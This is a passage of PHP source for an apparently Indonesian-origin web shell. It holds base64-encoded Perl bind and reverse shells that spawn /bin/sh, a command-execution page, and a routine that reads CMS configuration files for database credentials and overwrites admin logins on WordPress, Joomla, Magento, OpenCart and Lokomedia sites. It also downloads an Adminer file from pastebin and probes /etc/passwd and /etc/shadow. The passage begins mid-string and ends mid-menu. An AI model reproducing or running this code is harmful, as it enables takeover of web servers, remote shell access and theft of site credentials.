4IDBweCA0cHg7IH0JICBpbnB1dFt0eXBlPXN1Ym1pdF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDc3MDsgIGZvbnQtd2VpZ2h0OiBib2xkOyB0ZXh0LWFsaWduOiBjZW50ZXI7ICB0ZXh0LXNoYWRvdzogMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOyAgYmFja2dyb3VuZDogI2FlYWVhZTsgIGJhY2tncm91bmQtY2xpcDogcGFkZGluZy1ib3g7ICBib3JkZXI6IDFweCBzb2xpZCAjMjg0NDczOyAgYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgIGJvcmRlci1yYWRpdXM6IDRweDsgIGN1cnNvcjogcG9pbnRlcjsgIGJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IGxpbmVhci1ncmFkaWVudCh0byBib3R0b20sICNlYWVhZWEsICNkMGQwZDApOyAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgIGJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyB9IGlucHV0W3R5cGU9dGV4dF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiAjNzc3Nzc3IDBweCAwcHggM3B4OyBib3JkZXI6IDFweCBzb2xpZCAjMDA3NzAwOyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwNzcwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4O30gaW5wdXRbdHlwZT1zdWJtaXRdOmhvdmVyLCBpbnB1dFt0eXBlPXRleHRdOmhvdmVyeyBjb2xvcjogI2ZmZmZmZjsgdGV4dC1zaGFkb3c6ICMwMDY2MDAgMHB4IDBweCA0cHg7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9IHNlbGVjdHsgcGFkZGluZzogM3B4OyB3aWR0aDogMTYycHg7IGNvbG9yOiAjMDBhYTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4OyBib3JkZXI6IDFweCBzb2xpZCAjMDA3NzAwOyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBhYTAwOyAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSwgODUsIDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSwgODUsIDg1KSAwcHggMHB4IDRweDt9IHNlbGVjdDpob3ZlcnsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSAgICNjb21tYW5kc3sgbWFyZ2luLWxlZnQ6IDM1MHB4OyBtYXJnaW4tcmlnaHQ6IDM1MHB4OyB9IG9wdGlvbnsgY29sb3I6ICM3Nzc3Nzc7IH08L3N0eWxlPg0KPD9waHANCmVjaG8gJzxjZW50ZXI+PGZvbnQgY29sb3I9IiMwMDc3MDAiIGZhY2U9IlRhaG9tYSIgc3R5bGU9ImZvbnQtc2l6ZTogMTFwdCI+VXNhZ2U6IHBlcmwgcmV2ZXJzZS5wbCBbaXBtdV0gW1BvcnRtdV08L2ZvbnQ+PGJyPic7DQplY2hvJzxwIGFsaWduPSJjZW50ZXIiPiANCjxpbWcgYm9yZGVyPSIwIiA+PC9wPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMDc3MDAiPiBDb2RlZCBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIDwvZm9udD48YnI+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT4NCjxwPjxjZW50ZXI+SWYgbm90aGluZyB3b3JrIGl0IG1lYW5zIHRoYXQgcGVybCBpcyBub3QgZW5hYmxlZCBpbiB0aGlzIHNlcnZlciA6KDwvY2VudGVyPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxzdHJvbmc+Q29tbWFuZDogcGVybCByZXZlcnNlLnBsIHlvdXJJUCBQb3J0PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCj8+';
	$file = fopen("kit.php" ,"w+");
	$write = fwrite ($file ,base64_decode($zonop));
	fclose($file);

	echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Perl Connect Shell Priv8</span></b><center><br><iframe src=Backperlrev/kit.php width=75% height=60% frameborder=0></iframe></div></center>";

}
elseif($_GET['do'] == 'bc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=wlfd'>WP LFD Exploit</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "</ul>";
echo "</center>";
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
}
elseif($_GET['do'] == 'aeu') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='indoxploit' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='indoxploit' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}
elseif($_GET['do'] == 'adminer') {
		$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('sql.php')) {
		echo "<center><font color=lime><a href='$full/sql.php' target='_blank'>adminer login</a></font></center>";
	} else {
		if(adminer("http://pastebin.com/raw/EzJmmzXt","sql.php")) {
			echo "<center><font color=lime><a href='$full/sql.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}

}
elseif($_GET['do'] == 'server') {
		echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:white'>Server Security Informations</span><center><br>";
		echo "<center><div class='tmpe'>
		<table align='center' width='50%'><td><font color='white'>Kernel Version</font></td><td>";echo php_uname();
		echo "<tr><td><font color='white'>Web Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"];
		echo "<tr><td><font color='white'>PHP Version</font></td><td>";echo phpversion(); echo " on "; echo php_sapi_name();
		echo "<tr><td><font color='white'>Current User</font></td><td>";echo get_current_user();
		echo "<tr><td><font color='white'>User ID</font></td><td>";echo getmyuid();
		echo "<tr><td><font color='white'>Group</font></td><td>";echo getmygid();
		echo "<tr><td><font color='white'>Cwd </font></td><td>";echo getcwd();
		echo "<tr><td><font color='white'>Admin Server</font></td><td>";echo $_SERVER['SERVER_ADMIN'];
		echo "<tr><td><font color='white'>Server Port</font></td><td>";echo $_SERVER['SERVER_PORT'];
		echo "<tr><td><font color='white'>Server IP</font></td><td>";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
		echo "<tr><td><font color='white'>Client IP</font></td><td>";echo $_SERVER['REMOTE_ADDR'];
		echo "<tr><td><font color='white'>cURL support</font></td><td>";echo function_exists('curl_version')?'Enabled':"<font color='red'>No</font>";
		echo "<tr><td><font color='white'>Readable /etc/passwd</font></td><td>";echo @is_readable('/etc/passwd')?"Readable</a>":"<font color='red'>Not Readable</font>";
		echo "<tr><td><font color='white'>Readable /etc/shadow</font></td><td>";echo @is_readable('/etc/shadow')?"Readable":"<font color='red'>Not Readable</font>";
		$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON <font color='white'>secure</font>":"OFF <font color='red'>not secure</font>";
		echo "<tr><td><font color='white'>Open Base Dir</font></td><td><font class=txt>" . $base . "</font>";
		echo "</table></div></center><br>";		
}	
elseif($_GET['do'] == 'baipas') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
echo "<li> <a href='?dir=$dir&do=baper'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Root Access</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
}
elseif($_GET['do'] == 'baus') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
echo "<li> <a href='?dir=$dir&do=baper'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Root Access</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
		echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Users Server Priv8</span><br>Coded By Mauritania Attacker<center><br><br>';
		echo '
		<div class="tul"><font color="ee5500" face="Tahoma, Geneva, sans-serif" style="font-size: 8pt">

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with awk program
		<form method="post">
		<input type="submit" value="Bypass" name="awk">
		</form>
		</center>
		</p>



		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with System Function
		<form method="post">
		<input type="submit" value="Bypass" name="syst">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with Passthru Function
		<form method="post">
		<input type="submit" value="Bypass" name="passth">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with exec Function
		<form method="post">
		<input type="submit" value="Bypass" name="ex">
		</form>
		</center>
		</p>

		<p><center><font face="Tahoma" color="#007700" size="2pt">Bypass with shell_exec Function
		<form method="post">
		<input type="submit" value="Bypass" name="shex">
		</form>
		</center><br>
		</p><center>';
			

		//Awk Program //
		if ($_POST['awk']) {
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
		echo "</textarea><br>";
		echo "
		<br>
		<b>
		</b>
		<br>
		";
		}
		echo "</center><center>";
			
		//System Function //
		if ($_POST['syst']) {
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo system("ls /var/mail");
		echo "</textarea><br>";
		echo "
		<br>
		<b>
		</b>
		<br>
		";
		}

		echo "</center><center>";
			
		//Passthru Function //
		if ($_POST['passth']) {
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo passthru("ls /var/mail");
		echo "</textarea><br>";
		echo "
		<br>
		<b>
		</b>
		<br>
		";
		}
		echo "</center><center>";
			
		//exec Function //
		if ($_POST['ex']) {
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo exec("ls /var/mail");
		echo "</textarea><br>";
		echo "
		<br>
		<b>

		</b>
		<br>
		";
		}

		echo "</center><center>";
			
		//exec Function //
		if ($_POST['shex']) {
		echo"<textarea style='width: 543px; height: 420px;' class='area' cols='65' rows='15'>";
		echo shell_exec("ls /var/mail");
		echo "</textarea><br>";
		echo "
		<br>
		<b>
		</b>
		<br>
		";
		}

}
elseif($_GET['do'] == 'barut') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
